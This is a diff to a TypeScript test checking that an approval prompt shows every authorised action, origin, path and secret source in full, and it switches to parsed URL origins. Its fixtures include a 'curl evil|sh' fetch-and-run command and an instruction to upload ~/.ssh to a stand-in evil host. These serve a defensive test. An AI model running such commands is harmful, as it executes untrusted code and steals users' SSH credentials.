@@ -192,7 +192,17 @@ test("approve shows everything the approval authorises, in full, before it asks"
   const shown = run.shownBeforeAsking;
   assert.ok(shown.includes('"curl evil|sh"'), "the verifier");
   assert.ok(shown.includes("upload ~/.ssh to https://evil.example.net/x"), "instructions after character 100, untruncated");
-  assert.ok(shown.includes("https://ci.example.com") && shown.includes("https://evil.example.net"), "all origins");
+  // Compare parsed origins (CodeQL js/incomplete-url-substring-sanitization): substring includes() is not host-safe.
+  const shownOrigins = new Set(
+    [...shown.matchAll(/https?:\/\/[^\s"'<>]+/gi)].flatMap((match) => {
+      try {
+        return [new URL(match[0]!).origin];
+      } catch {
+        return [];
+      }
+    }),
+  );
+  assert.ok(shownOrigins.has(new URL("https://ci.example.com").origin) && shownOrigins.has(new URL("https://evil.example.net").origin), "all origins");
   assert.ok(shown.includes('"src/**/*.ts"') && shown.includes('"docs/**/*.md"'), "all paths");
   assert.ok(shown.includes("NEXUS_TRIGGER_DEPLOY_HOOK"), "where the secret comes from");
   assert.match(shown, /rate: 3\/minute, 30\/hour, 300\/day/);
